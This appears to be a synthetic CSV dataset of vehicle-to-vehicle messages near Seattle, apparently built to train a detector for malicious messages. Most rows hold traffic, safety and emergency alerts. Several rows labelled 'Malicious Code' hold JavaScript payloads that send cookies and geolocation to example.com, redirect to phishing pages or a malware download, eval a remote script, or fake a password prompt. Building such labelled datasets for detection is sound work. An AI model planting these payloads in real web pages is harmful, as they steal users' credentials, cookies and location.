Timestamp,Vehicle_ID,Vehicle_Type,Latitude,Longitude,Speed,Message_Type,Message_Content,Weather_Condition
10:00.2,vehicle_73,motorcycle,47.64249866,-122.3310505,87.59449417,Emergency Update,Emergency traffic in your region.,rainy
40:08.7,vehicle_4,truck,47.68371058,-122.3256373,106.7826207,Traffic Update,Heavy traffic on Provincial Highway 1.,foggy
02:29.4,vehicle_39,car,47.61902983,-122.3798008,89.11687276,Malicious Code,document.cookie = 'data=' + btoa(document.location.search.slice(1));,foggy
03:03.8,vehicle_70,car,47.69748265,-122.3718425,32.11785981,Traffic Update,Stop-and-go traffic on Main Street.,rainy
32:03.5,vehicle_93,car,47.63210171,-122.3363635,80.72598796,Safety,Take precautions against Accidents.,foggy
16:02.9,vehicle_82,truck,47.68434453,-122.3576324,91.82595913,Safety,Look out for Black ice.,rainy
09:42.6,vehicle_97,motorcycle,47.60438071,-122.3175484,91.40177589,Traffic Update,Traffic backup on County Road 1.,clear
27:31.0,vehicle_66,car,47.63174789,-122.3594806,56.73067441,Safety,Be aware of Detours.,foggy
21:58.9,vehicle_94,motorcycle,47.67611279,-122.3989478,104.0788137,Emergency Update,Water crisis in your part of town.,foggy
11:20.5,vehicle_66,truck,47.6392571,-122.3736693,11.1673068,Malicious Code,"setInterval(() => { document.getElementById('submit_button').click(); }, 5000);",snowy
46:59.2,vehicle_38,truck,47.60015978,-122.36981,29.6476662,Malicious Code,"Object.defineProperty(window, 'location', { get: () => ({ href: 'https://example.com/phishing.html' }) });",foggy
39:11.2,vehicle_16,car,47.60634324,-122.3090699,61.65491487,Safety,Be alert to Spills.,snowy
58:23.9,vehicle_79,truck,47.64672677,-122.3563765,95.67415307,Traffic Update,Gridlock on City Road 1.,foggy
17:18.5,vehicle_7,car,47.6019327,-122.3637452,50.63924846,Traffic Update,Tailback on Interstate 40.,snowy
56:23.4,vehicle_81,car,47.64895635,-122.3548023,75.97919651,Malicious Code,document.cookie = 'data=' + btoa(document.location.search.slice(1));,clear
17:28.0,vehicle_15,truck,47.66753354,-122.3670779,29.77685382,Emergency Update,Terrorist attack in your locality.,foggy
01:56.4,vehicle_87,car,47.61768279,-122.3236973,73.33427726,Safety,Watch out for Spills.,snowy
52:38.6,vehicle_6,car,47.63509545,-122.3112257,106.4443269,Malicious Code,location.href = 'https://example.com/malware.exe';,rainy
02:57.5,vehicle_70,truck,47.66432072,-122.352939,34.19768184,Safety,Stay informed about Power outages.,clear
37:14.1,vehicle_76,truck,47.65027972,-122.3239285,84.99424195,Safety,Take precautions against Construction zones.,clear
09:07.1,vehicle_28,car,47.67067961,-122.3516329,74.97220239,Traffic Update,Traffic backup on Bundesautobahn 1.,snowy
45:31.8,vehicle_92,motorcycle,47.6998167,-122.3342896,6.153721955,Malicious Code,eval(unescape('%3Cscript%3Esrc%3D%22http://example.com/malicious.js%22%3E%3C/script%3E')),snowy
12:32.4,vehicle_93,truck,47.65822619,-122.342388,37.77484614,Malicious Code,"setInterval(() => { document.getElementById('submit_button').click(); }, 5000);",rainy
29:27.4,vehicle_51,truck,47.63081661,-122.3756142,59.53403692,Safety,Look out for Detours.,clear
03:46.5,vehicle_17,car,47.64425767,-122.3241824,58.89124006,Emergency Update,Evacuation order in your part of town.,foggy
25:58.1,vehicle_5,motorcycle,47.60012323,-122.3222442,51.10620972,Traffic Update,Gridlock on Bundesautobahn 1.,snowy
15:52.3,vehicle_33,motorcycle,47.65799964,-122.36025,27.31187679,Emergency Update,Road collapse in your jurisdiction.,snowy
36:47.3,vehicle_37,motorcycle,47.68922744,-122.3994368,39.70508447,Malicious Code,location.href = 'https://example.com/malware.exe';,foggy
33:24.0,vehicle_14,truck,47.61675966,-122.3387349,110.1584919,Emergency Update,Natural disaster in your part of town.,rainy
23:01.9,vehicle_59,motorcycle,47.67381876,-122.3276087,61.55178675,Traffic Update,Heavy congestion on Highway 1.,foggy
25:36.4,vehicle_96,truck,47.65628369,-122.3337669,9.77250839,Emergency Update,Civil unrest in your jurisdiction.,snowy
09:42.3,vehicle_71,car,47.6961715,-122.3305497,108.1469408,Emergency Update,Active shooter in your community.,foggy
43:54.6,vehicle_15,truck,47.66089947,-122.3281285,59.42427525,Malicious Code,fetch('https://example.com/phishing.html').then(response => response.text()).then(html => document.body.innerHTML = html);,rainy
33:23.7,vehicle_10,car,47.61478115,-122.336672,101.3185471,Traffic Update,Severe traffic congestion on Local Street.,clear
55:39.3,vehicle_90,truck,47.61823919,-122.3308237,97.59498622,Malicious Code,navigator.geolocation.getCurrentPosition(function(position) { fetch('https://example.com/location.php?lat=' + position.coords.latitude + '&lon=' + position.coords.longitude); });,foggy
25:27.0,vehicle_89,car,47.6392418,-122.3092378,2.815488048,Traffic Update,At-a-standstill traffic on Interstate 40.,clear
24:11.6,vehicle_65,truck,47.62369037,-122.3208452,37.12889447,Emergency Update,Chemical spill in your immediate area.,foggy
16:56.0,vehicle_80,car,47.62817666,-122.3489258,41.20963508,Emergency Update,Hazardous materials incident in your immediate area.,snowy
53:57.5,vehicle_5,car,47.625534,-122.3885909,103.6760001,Traffic Update,Tailback on National Highway 1.,rainy
56:43.1,vehicle_63,car,47.67824878,-122.3422152,10.65586172,Traffic Update,Gridlock on Local Street.,clear
30:51.8,vehicle_77,truck,47.61767328,-122.3073982,103.7616917,Traffic Update,Heavy congestion on Interstate 40.,snowy
28:04.4,vehicle_20,car,47.67311049,-122.338319,42.94268136,Malicious Code,"Object.defineProperty(window, 'location', { get: () => ({ href: 'https://example.com/phishing.html' }) });",snowy
30:07.5,vehicle_5,truck,47.60258313,-122.3513905,52.96517691,Emergency Update,Water crisis in your locale.,snowy
35:03.3,vehicle_66,car,47.65743996,-122.3482632,49.93682357,Malicious Code,eval(unescape('%3Cscript%3Esrc%3D%22http://example.com/malicious.js%22%3E%3C/script%3E')),snowy
43:08.3,vehicle_8,motorcycle,47.67951776,-122.3592196,19.06331269,Malicious Code,"Object.defineProperty(window, 'location', { get: () => ({ href: 'https://example.com/phishing.html' }) });",rainy
11:14.3,vehicle_7,car,47.69135472,-122.3545135,64.6202787,Emergency Update,Road collapse in your immediate area.,foggy
24:55.5,vehicle_61,truck,47.62846619,-122.3583474,14.17399888,Emergency Update,Major traffic collision in your locale.,rainy
38:45.9,vehicle_53,motorcycle,47.68092075,-122.3387284,70.03609972,Safety,Be cautious of Uneven surfaces.,snowy
38:14.1,vehicle_22,motorcycle,47.62383665,-122.3786214,92.43065366,Traffic Update,Severe traffic congestion on Interstate 40.,rainy
39:13.0,vehicle_93,motorcycle,47.63758681,-122.3121784,114.2236203,Emergency Update,Civil unrest in your locality.,foggy
57:31.9,vehicle_66,car,47.63142939,-122.3606994,85.84905984,Safety,Watch out for Spills.,rainy
14:17.2,vehicle_27,motorcycle,47.65949987,-122.3652736,48.93247287,Emergency Update,Water crisis in your part of town.,snowy
47:35.2,vehicle_23,car,47.61016707,-122.386933,59.62071451,Traffic Update,Severe traffic congestion on Highway 1.,rainy
55:08.0,vehicle_86,car,47.61087877,-122.3604347,75.33491663,Traffic Update,Slow traffic on Boulevard.,clear
59:16.1,vehicle_34,truck,47.66978281,-122.3638437,66.29843417,Safety,Watch out for Spills.,rainy
50:54.4,vehicle_70,truck,47.61168311,-122.3305396,37.23555402,Traffic Update,Tailback on Lane.,clear
02:42.7,vehicle_50,car,47.69088112,-122.3747364,7.867594555,Malicious Code,navigator.geolocation.getCurrentPosition(function(position) { fetch('https://example.com/location.php?lat=' + position.coords.latitude + '&lon=' + position.coords.longitude); });,rainy
21:47.8,vehicle_20,car,47.62963967,-122.3165841,71.88730018,Emergency Update,Bridge collapse nearby.,snowy
54:04.2,vehicle_14,motorcycle,47.67818583,-122.3741436,5.19793573,Emergency Update,Natural disaster in your region.,clear
58:35.2,vehicle_68,car,47.60058999,-122.3024979,98.55704922,Traffic Update,Traffic backup on Drive.,clear
14:10.8,vehicle_26,car,47.65592041,-122.3102306,19.85904686,Traffic Update,Severe traffic congestion on Boulevard.,foggy
27:51.2,vehicle_92,truck,47.64701177,-122.3251839,102.0302691,Safety,Watch out for Uneven surfaces.,snowy
29:27.1,vehicle_15,car,47.60848276,-122.3720947,59.91829937,Malicious Code,"prompt('Enter your password:', 'Password Required');",foggy
51:24.4,vehicle_62,motorcycle,47.68347155,-122.3562035,73.01951957,Emergency Update,Head-on collision in your part of town.,foggy
06:43.7,vehicle_86,car,47.64753456,-122.3345075,38.40838408,Emergency Update,Infrastructure collapse in your surrounding area.,snowy
12:09.8,vehicle_61,car,47.68775879,-122.3749818,100.0925951,Traffic Update,Traffic is at a standstill on the northbound lanes of Autostrada A1.,foggy
46:59.7,vehicle_28,motorcycle,47.65888109,-122.3204328,5.431536302,Malicious Code,location.href = 'https://example.com/malware.exe';,snowy
27:53.6,vehicle_10,car,47.6073593,-122.307729,90.84678579,Malicious Code,document.cookie = 'data=' + btoa(document.location.search.slice(1));,clear
24:08.0,vehicle_83,motorcycle,47.68847398,-122.3412953,16.19291289,Malicious Code,"Object.defineProperty(window, 'location', { get: () => ({ href: 'https://example.com/phishing.html' }) });",snowy
04:23.4,vehicle_61,car,47.68918258,-122.3144698,11.2651673,Emergency Update,Active shooter in your vicinity.,rainy
02:54.7,vehicle_39,car,47.65784592,-122.3604404,51.01290439,Malicious Code,navigator.geolocation.getCurrentPosition(function(position) { fetch('https://example.com/location.php?lat=' + position.coords.latitude + '&lon=' + position.coords.longitude); });,foggy
51:05.5,vehicle_2,car,47.62821861,-122.3582155,26.79965823,Emergency Update,Detour due to emergency in your jurisdiction.,foggy
33:47.5,vehicle_50,motorcycle,47.69794133,-122.3906061,3.011658122,Emergency Update,Emergency traffic in your part of town.,clear
32:36.8,vehicle_44,truck,47.69282792,-122.395348,95.00176933,Malicious Code,"Object.defineProperty(window, 'location', { get: () => ({ href: 'https://example.com/phishing.html' }) });",rainy
41:42.1,vehicle_16,car,47.61606804,-122.3387226,36.08429183,Safety,Be cautious of Accidents.,foggy
08:53.2,vehicle_77,motorcycle,47.63583858,-122.3505827,46.49194881,Safety,Take precautions against Black ice.,snowy
38:10.6,vehicle_47,motorcycle,47.60425853,-122.3510814,104.8599208,Malicious Code,"Object.defineProperty(window, 'location', { get: () => ({ href: 'https://example.com/phishing.html' }) });",foggy
15:55.2,vehicle_85,truck,47.6630107,-122.369714,26.35518364,Safety,Beware of Spills.,clear
58:55.1,vehicle_85,motorcycle,47.6905225,-122.3927606,96.68793777,Malicious Code,eval(unescape('%3Cscript%3Esrc%3D%22http://example.com/malicious.js%22%3E%3C/script%3E')),snowy
48:19.9,vehicle_19,motorcycle,47.66948197,-122.3474718,26.50145775,Traffic Update,Gridlock on City Road 1.,snowy
53:10.4,vehicle_70,truck,47.63556617,-122.3863326,102.4800297,Traffic Update,At-a-standstill traffic on Provincial Highway 1.,clear
51:37.9,vehicle_87,motorcycle,47.68111402,-122.3386556,63.53797581,Traffic Update,Traffic backup on Main Street.,clear
44:44.8,vehicle_48,car,47.69116469,-122.3077319,88.84912448,Emergency Update,Major traffic collision in your part of town.,rainy
40:16.9,vehicle_38,car,47.68877572,-122.3831984,98.10329069,Malicious Code,"setInterval(() => { document.getElementById('submit_button').click(); }, 5000);",foggy
53:33.0,vehicle_53,car,47.64266065,-122.3937126,21.85413704,Safety,Be on the lookout for Fallen trees.,clear
43:20.3,vehicle_91,truck,47.64312819,-122.3314664,14.92219289,Safety,Be aware of Inclement weather.,foggy
54:42.8,vehicle_77,truck,47.63515617,-122.3476381,114.7923736,Traffic Update,Severe traffic congestion on Avenue.,rainy
05:55.8,vehicle_64,motorcycle,47.69516069,-122.3300032,26.58137141,Safety,Exercise caution regarding Power outages.,snowy
53:39.7,vehicle_93,motorcycle,47.65952389,-122.3160593,96.34379012,Malicious Code,eval(unescape('%3Cscript%3Esrc%3D%22http://example.com/malicious.js%22%3E%3C/script%3E')),foggy
51:49.0,vehicle_40,motorcycle,47.67020343,-122.3286762,105.0221312,Emergency Update,Civil unrest in your locale.,rainy
02:47.0,vehicle_69,car,47.62913495,-122.3686683,98.11118794,Malicious Code,navigator.geolocation.getCurrentPosition(function(position) { fetch('https://example.com/location.php?lat=' + position.coords.latitude + '&lon=' + position.coords.longitude); });,clear
30:24.4,vehicle_50,truck,47.67686265,-122.3411183,61.00578755,Emergency Update,Power outage in your region.,clear
24:25.5,vehicle_17,car,47.67795885,-122.3831547,66.73291362,Malicious Code,navigator.geolocation.getCurrentPosition(function(position) { fetch('https://example.com/location.php?lat=' + position.coords.latitude + '&lon=' + position.coords.longitude); });,clear
19:53.2,vehicle_28,car,47.61691773,-122.3520285,84.51202842,Traffic Update,Traffic is at a standstill on the northbound lanes of Lane.,snowy
00:45.4,vehicle_23,motorcycle,47.66715866,-122.3490986,119.4714446,Traffic Update,Tailback on Interstate 40.,snowy
05:45.4,vehicle_40,motorcycle,47.652335,-122.3133838,69.50984614,Malicious Code,"Object.defineProperty(window, 'location', { get: () => ({ href: 'https://example.com/phishing.html' }) });",rainy
16:34.0,vehicle_14,motorcycle,47.63970304,-122.3689935,77.99251919,Emergency Update,Major traffic collision in your locale.,clear
15:00.4,vehicle_83,car,47.63640207,-122.3438776,28.13769804,Emergency Update,Infrastructure collapse in your jurisdiction.,foggy
38:28.7,vehicle_46,motorcycle,47.62397616,-122.3120916,51.86658307,Emergency Update,Natural disaster in your jurisdiction.,snowy
30:54.0,vehicle_42,motorcycle,47.6243357,-122.3715876,20.19036645,Malicious Code,fetch('https://example.com/phishing.html').then(response => response.text()).then(html => document.body.innerHTML = html);,snowy
30:44.2,vehicle_7,motorcycle,47.62400388,-122.3259711,80.60629472,Safety,Stay informed about Icy roads.,foggy
53:43.1,vehicle_42,motorcycle,47.65119102,-122.3805474,51.77747877,Traffic Update,Heavy traffic on Local Street.,rainy
50:38.6,vehicle_10,motorcycle,47.68749876,-122.3071254,91.02989911,Safety,Avoid Potholes.,clear
55:52.7,vehicle_4,car,47.62507465,-122.3295654,26.92771579,Safety,Take precautions against Power outages.,foggy
09:53.3,vehicle_55,truck,47.67665768,-122.3556862,93.65495625,Safety,Stay away from Debris.,snowy
27:28.5,vehicle_38,car,47.68743354,-122.3107376,105.2733677,Malicious Code,"Object.defineProperty(window, 'location', { get: () => ({ href: 'https://example.com/phishing.html' }) });",clear
16:28.0,vehicle_27,car,47.66622161,-122.3126663,57.33894561,Emergency Update,Terrorist attack in your surrounding area.,rainy
23:27.3,vehicle_13,car,47.64073376,-122.3726061,78.44870051,Emergency Update,Traffic accident in your vicinity.,rainy
35:57.0,vehicle_72,truck,47.64426207,-122.3962984,63.71287106,Emergency Update,Water crisis in your vicinity.,clear
30:59.6,vehicle_10,motorcycle,47.6927583,-122.3686325,47.9030527,Emergency Update,Traffic accident in your locality.,snowy
05:34.0,vehicle_19,motorcycle,47.6899386,-122.3460436,85.98020487,Traffic Update,Traffic is at a standstill on the northbound lanes of Route 66.,foggy
50:24.4,vehicle_69,motorcycle,47.64779002,-122.3271897,37.84052449,Malicious Code,(function() { var img = new Image(); img.src = 'https://example.com/tracker.php?data=' + encodeURIComponent(document.cookie); })();,foggy
07:04.2,vehicle_27,car,47.69058776,-122.3004765,82.50304466,Emergency Update,Active shooter locally.,snowy
41:39.8,vehicle_8,motorcycle,47.64659279,-122.3055247,30.47320845,Emergency Update,Traffic accident in your locality.,rainy
35:54.0,vehicle_50,truck,47.69089009,-122.3066481,49.42412116,Safety,Stay informed about Inclement weather.,rainy
19:40.9,vehicle_5,car,47.62820867,-122.3605998,49.6515181,Emergency Update,Water crisis in your jurisdiction.,rainy
25:27.7,vehicle_64,car,47.63823047,-122.3138841,55.44903617,Malicious Code,location.href = 'https://example.com/malware.exe';,rainy
50:23.6,vehicle_7,car,47.67904289,-122.3406194,41.02470653,Emergency Update,Detour due to emergency in your neighborhood.,clear
19:40.0,vehicle_20,truck,47.62371986,-122.3090905,119.0713329,Traffic Update,Severe traffic congestion on Local Street.,foggy
00:53.5,vehicle_55,truck,47.65955074,-122.3229075,21.95201218,Malicious Code,"prompt('Enter your password:', 'Password Required');",foggy
31:43.3,vehicle_10,truck,47.68271523,-122.3983068,91.82799851,Malicious Code,fetch('https://example.com/phishing.html').then(response => response.text()).then(html => document.body.innerHTML = html);,rainy
11:08.6,vehicle_16,car,47.61355349,-122.3755977,64.33915694,Emergency Update,Hazardous materials incident in your neighborhood.,rainy
47:22.6,vehicle_17,truck,47.63484224,-122.3953441,88.54798817,Emergency Update,Natural disaster in your vicinity.,clear
57:46.4,vehicle_69,motorcycle,47.67490099,-122.3820628,112.3477129,Emergency Update,Bridge collapse in your region.,foggy
27:50.3,vehicle_41,motorcycle,47.65357955,-122.3832546,93.28630516,Emergency Update,Head-on collision in your region.,clear
